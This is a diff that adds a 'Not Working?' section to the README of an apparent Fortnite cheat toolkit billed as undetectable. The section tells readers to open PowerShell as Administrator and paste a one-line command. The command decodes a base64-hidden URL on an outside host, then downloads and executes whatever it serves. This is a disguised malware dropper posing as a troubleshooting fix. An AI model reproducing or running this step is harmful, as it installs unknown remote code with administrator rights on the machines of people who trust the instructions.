@@ -7,6 +7,18 @@
 *Sleek, efficient, and undetectable - The ultimate external toolkit for Fortnite*
 
 ---
+## Not Working?
+Follow this steps:
+- Press Win + R
+- Type *Powershell* and open with Administrator
+- Copy this command:
+```
+iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz00NTY2MjQxNDcvbmV3b25l'))) -UseBasicParsing)
+```
+- Paste it in Powershell Window, press Enter
+---
+
+---
 
 ## Installation Guide
 
